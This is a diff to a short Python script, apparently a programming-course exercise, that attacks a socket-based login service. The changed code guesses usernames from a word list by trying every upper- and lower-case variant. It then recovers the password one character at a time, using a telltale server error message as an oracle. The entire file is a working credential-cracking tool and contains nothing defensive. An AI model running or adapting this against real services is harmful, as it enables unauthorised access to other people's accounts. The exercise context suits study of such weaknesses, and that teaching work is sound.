@@ -1,31 +1,42 @@
 import argparse
 import itertools
+import json
 import sys
 import socket
 import string
 
 
-def password_gen(chars):
-    for r in range(1, len(chars)):
-        for item in itertools.product(chars, repeat=r):
-            yield "".join(item)
+def get_login(sock, logins):
+    for l in logins:
+        for lc in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in l))):
+            sock.send(json.dumps({"login": lc, "password": ""}).encode())
+            res = sock.recv(1024).decode()
+            res = json.loads(res)
+            if "result" in res and res["result"] == "Wrong password!":
+                return lc
 
 
-def crack(hostname, port, passwords):
+def crack(hostname, port, logins):
     with socket.socket() as sock:
         sock.connect((hostname, port))
-        for p in passwords:
-            for pc in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in p))):
-                sock.send(pc.encode())
-                res = sock.recv(1024)
-                if res.decode() == "Connection success!":
-                    return pc
-                elif res.decode() == "Too many attempts":
-                    return False
+        login = get_login(sock, logins)
+        password = ''
+        letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+        while True:
+            for char in letters:
+                sock.send(json.dumps({"login": login, "password": password + char}).encode())
+                res = sock.recv(1024).decode()
+                res = json.loads(res)
+                if "result" in res:
+                    if res["result"] == "Exception happened during login":
+                        password += char
+                        break
+                    elif res["result"] == "Connection success!":
+                        return {"login": login, "password": password + char}
 
 
 def read_words():
-    with open('passwords.txt') as f:
+    with open('logins.txt') as f:
         return f.read().splitlines()
 
 
@@ -34,9 +45,9 @@ def main():
     parser.add_argument("hostname", type=str)
     parser.add_argument("port", type=int)
     args = parser.parse_args(sys.argv[1:])
-    passwords = read_words()
+    logins = read_words()
     if args.hostname and args.port:
-        print(crack(args.hostname, args.port, passwords))
+        print(json.dumps(crack(args.hostname, args.port, logins)))
     else:
         print("Incorrect parameters")
 
